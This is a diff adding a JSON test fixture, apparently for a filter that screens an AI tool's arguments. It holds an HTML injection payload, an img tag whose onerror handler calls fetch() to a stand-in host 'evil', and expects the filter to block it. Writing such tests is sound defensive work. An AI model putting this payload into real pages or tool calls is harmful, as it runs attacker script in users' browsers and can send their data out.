@@ -1,0 +1,9 @@
+{
+  "category": "html-inject",
+  "toolName": "search",
+  "arguments": {
+    "html": "<img src=x onerror=fetch(`https://evil`)>"
+  },
+  "ruleHint": "exfiltration-url",
+  "expected": "block"
+}
